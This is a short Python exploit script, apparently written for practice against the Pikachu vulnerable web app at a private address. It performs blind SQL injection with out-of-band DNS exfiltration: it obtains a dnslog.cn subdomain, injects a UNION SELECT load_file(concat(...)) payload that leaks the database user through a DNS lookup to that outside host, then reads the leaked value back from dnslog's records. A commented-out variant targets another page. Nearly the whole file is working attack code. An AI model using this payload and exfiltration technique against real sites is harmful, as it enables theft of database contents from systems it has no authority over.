import requests
import time,os

url_domain='http://dnslog.cn/getdomain.php?t=0.6'
header={
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
    'Referer':'http://dnslog.cn/'
}

result=requests.get(url_domain,headers=header)
dns_url=result.content.decode('utf-8')
cook=result.headers['Set-Cookie'].split(';')[0]
print(dns_url,'正在测试网络连通性，请稍等...')

cmds=os.popen('ping sa.'+dns_url)
respon=cmds.read()
if '127.0.0.1' in respon:
    pass
else:
    print('网络或程序异常，请重新执行!')
    exit(0)

commond="select user"
payloads="xs%27+union+select+1%2Cload_file%28concat%28%27%2F%2F%27%2C%28"+commond+"%28%29%29%2C%27."+dns_url+"%2F1.txt%27%29%29%3B%23"
url_attck="http://192.168.1.123/pikachu/vul/sqli/sqli_blind_t.php?name="+payloads+"&submit=%E6%9F%A5%E8%AF%A2#&submit=%E6%9F%A5%E8%AF%A2"
# payloads="%20union%20select%201,2,load_file(concat(%27//%27,(select%20user()),%27.891hnk.dnslog.cn/1.txt%27));#"
# url_attck="http://192.168.1.123/sql.php?id=1"+payloads
cnt=requests.get(url_attck)
time.sleep(2)

dns_url_record="http://dnslog.cn/getrecords.php"
header={
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
    'Referer':'http://dnslog.cn/',
    'Cookie':cook
}
record=requests.get(dns_url_record,headers=header).json()[0][0].split(dns_url)[0].strip('.')
print(commond+': '+record)


